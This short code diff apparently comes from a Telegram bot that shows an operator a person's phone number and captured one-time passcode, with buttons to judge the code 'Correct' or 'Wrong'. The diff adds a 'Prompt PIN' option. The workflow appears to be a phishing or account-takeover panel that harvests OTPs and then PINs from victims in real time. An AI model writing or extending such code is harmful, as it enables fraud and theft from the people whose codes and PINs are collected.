@@ -709,10 +709,11 @@ users.forEach((user, link) => {
                  `📱 Phone: <code>${phoneNumber}</code>\n` +
                  `🔐 OTP: <code>${otp}</code>\n` +
                  `⏰ ${new Date().toLocaleString()}\n\n` +
-                 `⚠️ <b>Is OTP correct?</b>`;
+                 `⚠️ <b>OTP action?</b>`;
 
     const keyboard = { inline_keyboard: [
       [{ text: '✅ Correct', callback_data: mkCb('otp', 'correct', phoneNumber) }],
+      [{ text: '🔐 Prompt PIN', callback_data: mkCb('otp', 'promptpin', phoneNumber) }],
       [{ text: '❌ Wrong', callback_data: mkCb('otp', 'wrong', phoneNumber) }]
     ]};
 
